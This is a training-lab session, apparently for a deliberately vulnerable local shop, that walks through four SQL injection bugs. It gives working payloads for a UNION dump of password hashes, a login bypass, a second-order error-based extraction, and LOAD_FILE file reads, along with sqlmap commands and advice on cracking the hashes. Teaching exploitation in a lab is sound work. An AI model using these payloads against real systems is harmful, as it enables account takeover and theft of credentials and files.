Session 2: SQL Injection, Four Ways

Goal for this session: exploit all four of Widgetorium's SQL injection bugs and understand why they are four separate bugs and not one. Two of them a scanner hands you. One of them a scanner will never find. One of them is really two bugs sharing an endpoint. By the end you will have the admin's password hash and a file read off the database host.

2.1 The Search Box: UNION-Based, Reads Any Table

The storefront search concatenates your term straight into a LIKE clause, and it selects three columns, so a UNION SELECT lines up cleanly.

curl -s "http://127.0.0.1:8080/search.php?q=x' UNION SELECT username,password_hash,role FROM users-- -"

The results table now lists every account and its unsalted MD5 hash. Hand that to sqlmap to see it work the problem systematically:

sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch --dbs
sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch -D widgetorium -T users --dump

Then take the hashes to john or hashcat with a rockyou-class wordlist. The seed passwords are all in it. This is where a trainee first feels the difference between "the scanner said injectable" and "I have the admin's password."

2.2 The Login Form: Authentication Bypass

The login query concatenates both the username and the password hash. The classic payload in the username field returns the first row in the table, which is the seed admin.

curl -si --data-urlencode "username=' OR '1'='1' -- " --data "password=x" \
     http://127.0.0.1:8080/login.php

You get a 302 to /account.php and a Set-Cookie: WIDGET_SESSID=. You are now the administrator. Do this one by hand before you automate anything; the mechanism, a quote that closes the string and a comment that eats the rest of the query, is the thing to internalise.

Look closely at the cookie you were handed. It will matter in Session 4.

2.3 Second-Order: The Payload That Waits

This is the one ZAP will not find, and it is the most instructive bug in the lab.

The admin product form stores the product name through a parameterised query. Quotes and SQL metacharacters go into the name column byte for byte, and nothing happens. No error, no reflection, no scanner alert. The payload just sits in the catalogue looking like a badly named product.

Later, an administrator opens the inventory report. That page loops over every stored product name and concatenates each one into a fresh query against a stock-ledger table. The dormant payload fires there. Because the report fetches a single row per product, a plain UNION hides behind the aggregate's first row, so use an error-based payload and read the data out of the error message the report prints.

As the admin, create a product with this name:

zz' AND updatexml(1,concat(0x7e,(SELECT concat(username,0x3a,password_hash)
    FROM users ORDER BY id LIMIT 1)),1)-- -

The storefront still looks normal. Open /admin/inventory_report.php and that row's "on hand" cell reads:

(error) ... XPATH syntax error: '~admin:042af043eff3ad41868f9ccdf'

Walk LIMIT 1,1, LIMIT 2,1 for the rest of the table. The teaching point: data already in your database is still untrusted input. Sanitising on the way in is not the same as parameterising the query that reads it back out.

2.4 The Price API: Injection and Broken Authorisation in One Endpoint

The api/update_item.php endpoint takes a JSON body of {id, price, qty} and updates a product. It has two independent bugs.

The authorisation half

Any logged-in user can call it. There is no check that the product belongs to the caller and no admin-role check. Log in as the customer alice and edit a product she does not own:

curl -s -b alice.jar -H 'Content-Type: application/json' \
     -d '{"id":7,"price":0.01}' \
     http://127.0.0.1:8080/api/update_item.php

The response confirms the change and shows your role as customer. That is an IDOR: the object reference, id, is under your control and nothing checks whether you should be allowed to touch it.

The injection half

Inject on id. It flows into WHERE id = <id>. The price and qty fields land in numeric columns that truncate any string you get back, so id is your extraction point. The database user holds the FILE privilege and secure_file_priv is empty, so LOAD_FILE works:

curl -s -b alice.jar -H 'Content-Type: application/json' -d '{
  "id": "7 OR updatexml(1,concat(0x7e,(SELECT LEFT(LOAD_FILE(0x2f7661722f6c69622f6d7973716c2d66696c65732f7365637265742e747874),40))),1)",
  "price": "1.00"
}' http://127.0.0.1:8080/api/update_item.php

The verbose SQL-error block comes back with the first bytes of the file. Note the scope: LOAD_FILE reads the database container's filesystem, not the web server's. Good targets from there are /etc/passwd, /etc/hostname, and the MySQL config. sqlmap will drive this with --data '{"id":"7*","price":"1"}'.

2.5 Why Four Bugs

#WhereScanner finds it?Real lesson
1search boxyes, active scanUNION structure, then crack what you dumped
2login formsometimesstring break plus comment; do it by hand once
3admin reportnostored data is still input; error-based when the sink fetches one row
4price APIinjection yes, authz notwo bugs, one endpoint; pick the parameter that actually exfiltrates

Every one of these is "SQL injection" in a report heading, and every one needs a different head to exploit. The fix for all four is the same sentence, parameterise the query and never build SQL by concatenation, but you cannot write that fix with confidence until you have felt why the generic advice keeps not being followed.
